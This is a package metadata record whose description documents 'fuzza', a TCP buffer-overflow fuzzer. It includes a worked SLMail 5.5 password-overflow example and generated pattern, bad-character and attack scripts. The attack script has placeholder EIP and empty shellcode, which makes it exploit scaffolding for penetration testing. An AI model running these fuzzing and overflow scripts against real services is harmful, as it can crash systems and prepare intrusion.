{"info": {"author": "cytopia", "author_email": "cytopia@everythingcli.org", "bugtrack_url": null, "classifiers": ["Development Status :: 4 - Beta", "Intended Audience :: Developers", "License :: OSI Approved :: MIT License", "Operating System :: OS Independent", "Programming Language :: Python :: 2", "Programming Language :: Python :: 3", "Topic :: Software Development :: Build Tools"], "description": "# fuzza\n\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![PyPI](https://img.shields.io/pypi/v/fuzza)](https://pypi.org/project/fuzza/)\n[![PyPI - Status](https://img.shields.io/pypi/status/fuzza)](https://pypi.org/project/fuzza/)\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/fuzza)](https://pypi.org/project/fuzza/)\n[![PyPI - Format](https://img.shields.io/pypi/format/fuzza)](https://pypi.org/project/fuzza/)\n[![PyPI - Implementation](https://img.shields.io/pypi/implementation/fuzza)](https://pypi.org/project/fuzza/)\n[![PyPI - License](https://img.shields.io/pypi/l/fuzza)](https://pypi.org/project/fuzza/)\n\n[![Build Status](https://github.com/cytopia/fuzza/workflows/linting/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=linting)\n[![Build Status](https://github.com/cytopia/fuzza/workflows/testing/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=testing)\n[![Build Status](https://github.com/cytopia/fuzza/workflows/building/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=building)\n\nCustomizable TCP fuzzing tool to test for remote buffer overflows.\n\n`fuzza` is able to send and receive any initial commands prior sending the payload as well as\nsending any post commands after the payload has been sent. In order to replicate and triage the\nbuffer overflow, `fuzza` can be used to generate custom python scripts for attack, badchars and\nfinding the eip based on your command line arguments. See examples for more details.\n\n\n## Features\n\n* Works similar to [generic_send_tcp](https://www.codeproject.com/articles/19307/generic-tcp-ip-client-server), but instructions are specified via command line arguments\n* Has an [expect](https://linux.die.net/man/1/expect)-like feature to wait for a specific response which also supports regex\n* Generates custom Python scripts based on your command line arguments to triage the overflow\n* Works with Python2 and Python3\n\n\n## Installation\n```bash\npip install fuzza\n```\n\n\n## Usage\n```bash\n$ fuzza --help\n\nusage: fuzza [options] host port\n       fuzza --help\n       fuzza --version\n\nCustomizable TCP fuzzing tool to test for remote buffer overflows.\n\nIt works in two different modes: normal and generate. Normal mode will send your payload\nto a remote endpoint and increase the payload size each round in order to try to crash the\nservice. The generate mode however will generate three easy to use python scripts to\nfurther triage any potential buffer overflow manually.\n\npositional arguments:\n  host                  IP or hostname to connect to.\n  port                  Port to connect to.\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -v, --version         Show version information,\n  -c char, --char char  Buffer character to send as payload. Default: \"A\"\n  -p str, --prefix str  Prefix string to prepend to buffer. Empty by default.\n  -s str, --suffix str  Suffix string to append to buffer. Empty by default.\n  -l int, --length int  Initial length to concat buffer string with x*char.\n                        When using the '-g' option to generate reproducible attack scripts set this\n                        to the value at which the crash occured in order to pre-populate the\n                        generated scripts. Default: 100\n  -m int, --multiply int\n                        Round multiplier to concat buffer string with x*char every round.\n                        Default: 100\n  -i str, --init str    If specified, initializes communication before sending the payload in the\n                        form '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be\n                        sent to the server and <expect> is the answer to be received from the\n                        server.  Either one of <send> or <expect> can be omitted if you expect\n                        something without having sent data yet or need to send something for which\n                        there will not be an answer. Multiple <send>:<expect> are supported and\n                        must be separated by a comma.\n                        Regex supported for <expect> part.\n  -e str, --exit str    If specified, finalizes communication after sending the payload in the\n                        form '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be\n                        sent to the server and <expect> is the answer to be received from the\n                        server.  Either one of <send> or <expect> can be omitted if you expect\n                        something without having sent data yet or need to send something for\n                        which there will not be an answer. Multiple <send>:<expect> are supported\n                        and must be separated by a comma.\n                        Regex supported for <expect> part.\n  -t float, --timeout float\n                        Timeout in sec for receiving data before declaring the endpoint as crashed.\n                        Default: 30.0\n  -d float, --delay float\n                        Delay in seconds between each round. Default: 1.0\n  -g dir, --generate dir\n                        Generate custom python scripts based on your command line arguments\n                        to reproduce and triage the overflow. Requires a directory to be\n                        specified where to save the scripts to.\n\nexample:\n\n  The following example illustrates how to use the initial communication by:\n      1. Expecting the POP3 server banner\n      2. Sending 'USER bob'\n      3. Expecting a welcome message\n  Additionally before sending the fuzzing characters, it is prepended with 'PASS ',\n  so that the actuall fuzzing can be done on the password:\n     1. Prefix payload with 'PASS '\n     2. Send payload\n  Lastly in order to also close the connection the '-e' opton is used\n  (which works exactly as '-i') in order to send data after the payload.\n     1. Expect any response from password payload\n     2. Terminate the connection via QUIT\n     3. Do not expect a follow up response\n  $ fuzza -i ':.*POP3.*,USER bob\\r\\n:.*welcome.*' -e ':.*,QUIT:' -p 'PASS ' -s '\\r\\n'\n\nVisit https://github.com/cytopia/fuzza for more examples.\n```\n\n\n## Modes\n\n### Normal\n\nIn normal mode you can communicate with a network service and specify at which stage of the\ncommunication to send an increasing buffer.\n\nThe following example sends an ever increasing buffer to host.example.tld at port 4444:\n```bash\n$ fuzza host.example.tld 4444\n```\n\nThe following example connects to an IMAP service, waits for its banner and tries to overflow\nthe password value of `a LOGIN <user> <pass>`:\n```bash\n$ fuzza -i ':.*' -p 'a LOGIN bob ' -s '\\r\\n' host.example.tld 143\n```\n\n### Generate\n\nIf you have found a potential buffer overflow, it is time to generate your triage scripts with the\nsame parameter used for finding the overflow.\n\nIn the following example you have found a buffer overflow on host.example.tld at port 4444 at\n300 characters and can start to generate your files:\n```bash\n$ fuzza host.example.tld 4444 -l 300 -g output/\n```\n\nThe scripts will be pre-populated with any command line arguments specified.\n\n\n#### `pattern.py`\n\nThis is the first script you will want to use. It is already pre-populated with characters from\n`pattern_create.rb` at length 300. There is no modification required. Simply start your debugger\nof choice, watch your application and run `pattern.py` without any arguments. Whatever ends up in\nyour EIP can be thrown into `pattern_offset.rb` and you have the length of the overflow.\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\npattern = (\n    \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9\"\n    \"Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"\n    \"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9\"\n    \"Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\"\n)  # 300 bytes from pattern_create.rb\n\nprint('Trying to send %s bytes unique chars...' % (str(len(pattern))))\ntry:\n    s.connect(('host.example.tld', 4444))\n    s.send(str2b('' + pattern + ''))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\nNext thing you will want to do is to adjust the `len_overflow` variable in `badchars.py` and\n`attack.py` with the value you found via `pattern_offset.rb`\n\n\n#### `badchars.py`\n\nThis script will help you to identify any characters that are squashed or truncated in memory, ie.\nthe bad characters that cannot be used for the payload.\n\nBefore running it, remember to adjust the `len_overflow` variable.\n\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nlen_overflow = 300      # Use pattern_create.rb and pattern_offset.rb to find exact offset\neip          = \"B\"*4     # Ignore for badchar detection\nbadchars = (\n    \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n    \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n    \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n    \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n    \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n    \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n    \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n    \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n    \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n    \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n    \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n    \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n    \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n    \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n    \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n    \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\nbuffer = \"A\"*len_overflow + eip + badchars\n\nprint('Trying to send %s bytes buffer...' % (str(len(buffer))))\ntry:\n    s.connect(('host.example.tld', 4444))\n    s.send(str2b('' + buffer + ''))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\n\n#### `attack.py`\n\nIn this script everything comes together and you can:\n1. Adjust the overflow length\n2. Adjust the nop sled length\n3. Set EIP address\n4. Add shellcode\n5. Add padding\n\nThere is also not much to write, as you just need to fill variables and most other stuff is simply\nauto-calculated.\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nlen_total    = 300                # Start at len_overflow and try out how much can be overwritten\nlen_overflow = 296                # Use pattern_create.rb and pattern_offset.rb to find exact offset\nlen_nop_sled = 0                   # Add x bytes of nops before shellcode for shellcode decoding\neip          = \"\\x42\\x42\\x42\\x42\"  # Change this (Keep in mind to put address in reverse order)\nshellcode    = \"\"\n\npadding = \"C\"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))\nbuffer  = \"A\"*len_overflow + eip + \"\\x90\"*len_nop_sled + shellcode + padding\n\nprint('Trying to send %s bytes buffer...' % (str(len(buffer))))\ntry:\n    s.connect(('host.example.tld', 4444))\n    s.send(str2b('' + buffer + ''))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\n\n## Examples\n\n### SLMail 5.5 Buffer overflow\n\n#### Overview\n\n* [CVE-2003-0264](https://www.cvedetails.com/cve/CVE-2003-0264/) - buffer overflow in password.\n\nTo see how the raw communication works, have a look at the following netcat snippet:\n```bash\n$ nc mail.example.tld 110\n+OK POP3 server mail.example.tld ready <00001.544405549@mail.example.tld>\nUSER test\n+OK test welcome here\nPASS LongPassword\n-ERR unable to lock mailbox\nQUIT\n```\n\n#### Find potential overflow length\n\nIn order to fuzz the password, all previous communication must have happened. By using `fuzza`,\nthis can be achieved with the `-i` argument to specify initial data to be send and received.\nAdditionally we also want to close the connection after sending the payload (if possible).\nThis can be achieved with the `-e` option which works exactly as `-i`.\n```bash\n$ fuzza -i ':.*OK POP3.*,USER test\\r\\n:.*test welcome.*' -p 'PASS ' -s '\\r\\n' -e ':.*,QUIT\\r\\n:' mail.example.tld 110\n\n------------------------------------------------------------\nA * 100\n------------------------------------------------------------\nInit Awaiting:   \".*OK POP3.*\"\nInit Received:   \"+OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>\"\nInit Sending:    \"USER test\\r\\n\"\nInit Awaiting:   \"test welcome\"\nInit Received:   \"+OK test welcome here\"\nSending Payload: \"PASS \" + \"A\"*100 + \"\\r\\n\"\nExit Awaiting:   \".*\"\nExit Received:   \"-ERR unable to lock mailbox\"\nExit Sending:    \"QUIT\\r\\n\"\n...\n\n------------------------------------------------------------\nA * 2700\n------------------------------------------------------------\nInit Awaiting:   \".*OK POP3.*\"\nInit Received:   \"+OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>\"\nInit Sending:    \"USER test\\r\\n\"\nInit Awaiting:   \"test welcome\"\nInit Received:   \"+OK test welcome here\"\nSending Payload: \"PASS \" + \"A\"*2700 + \"\\r\\n\"\nExit Awaiting:   \".*\"\n\nRemote service (most likely) crashed at 2700 bytes of \"A\"\nPayload sent:\nPASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n```\n\n#### Generate triaging scripts\n\nNow that you know the application is potentially vulnerable at or before 2700 bytes, you will have\nto try to replicate and triage the buffer overflow. In order to do so, you can use `fuzza` to\nautomatically generate triaging scripts based on your current arguments and findings.\n\nUse the same arguments as before, add the initial length of 2700 bytes (`-l 2700`) and specify\nan output directory (`-g <path>`):\n```bash\n$ fuzza -i ':.*OK POP3.*,USER test\\r\\n:.*test welcome.*' -p 'PASS ' -s '\\r\\n' -e ':.*,QUIT\\r\\n:' -l 2700 -g out/ mail.example.tld 110\n```\n`fuzza` will then generate three files in `out/` directory based on your command line arguments:\n\n1. `attack.py`  - used to replicate and triage buffer overflow\n2. `pattern.py` - used to find offset for EIP\n3. `badchars.py` - used to find any bad characters for the exploit shellcode\n\nBased on the above specified command line arguments, the triaging scripts will look as follows:\n\n**`attack.py`**\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nlen_total    = 2700                # Start at len_overflow and try out how much can be overwritten\nlen_overflow = 2696                # Use pattern_create.rb and pattern_offset.rb to find exact offset\nlen_nop_sled = 0                   # Add x bytes of nops before shellcode for shellcode decoding\neip          = \"\\x42\\x42\\x42\\x42\"  # Change this (Keep in mind to put address in reverse order)\nshellcode    = \"\"\n\npadding = \"C\"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))\nbuffer  = \"A\"*len_overflow + eip + \"\\x90\"*len_nop_sled + shellcode + padding\n\nprint('Trying to send %s bytes buffer...' % (str(len(buffer))))\ntry:\n    s.connect(('mail.example.tld', 110))\n    s.recv(1024)\n    s.send(str2b('USER test\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('PASS ' + buffer + '\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('QUIT\\r\\n'))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\n**`pattern.py`**\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\npattern = (\n    \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9\"\n    \"Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9\"\n    \"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9\"\n    \"Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9\"\n    \"Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9\"\n    \"Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9\"\n    \"As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9\"\n    \"Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9\"\n    \"Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9\"\n    \"Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9\"\n    \"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9\"\n    \"Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9\"\n    \"Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9\"\n    \"Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9\"\n    \"Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9\"\n    \"Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9\"\n    \"Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9\"\n    \"Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9\"\n    \"Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9\"\n    \"Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9\"\n    \"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9\"\n    \"Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9\"\n    \"Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9\"\n    \"Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9\"\n    \"Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9\"\n    \"Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9\"\n    \"Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9\"\n    \"Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9\"\n    \"Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9\"\n    \"Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9\"\n)  # 2700 bytes from pattern_create.rb\n\nprint('Trying to send %s bytes unique chars...' % (str(len(pattern))))\ntry:\n    s.connect(('mail.example.tld', 110))\n    s.recv(1024)\n    s.send(str2b('USER test\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('PASS ' + pattern + '\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('QUIT\\r\\n'))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\n**`badchars.py`**\n```python\n#!/usr/bin/env python\n\"\"\"fuzza autogenerated.\"\"\"\n\nfrom __future__ import print_function\nimport socket\n\ndef str2b(data):\n    \"\"\"Unescape P2/P3 and convert to bytes if Python3.\"\"\"\n    # Python2: Unescape control chars\n    try:\n        return data.decode('string_escape')\n    except AttributeError:\n        pass\n    except UnicodeDecodeError:\n        pass\n    # Python3: Unescape control chars and convert to byte\n    try:\n        return data.encode(\"utf-8\").decode('unicode-escape').encode(\"latin1\")\n    except UnicodeDecodeError:\n        pass\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nlen_overflow = 2700      # Use pattern_create.rb and pattern_offset.rb to find exact offset\neip          = \"B\"*4     # Ignore for badchar detection\nbadchars = (\n    \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n    \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n    \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n    \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n    \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n    \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n    \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n    \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n    \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n    \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n    \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n    \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n    \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n    \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n    \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n    \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\nbuffer = \"A\"*len_overflow + eip + badchars\n\nprint('Trying to send %s bytes buffer...' % (str(len(buffer))))\ntry:\n    s.connect(('mail.example.tld', 110))\n    s.recv(1024)\n    s.send(str2b('USER test\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('PASS ' + buffer + '\\r\\n'))\n    s.recv(1024)\n    s.send(str2b('QUIT\\r\\n'))\n    print('done')\nexcept:\n    print('Could not connect')\ns.close()\n```\n\n\n## Disclaimer\n\nThis tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. 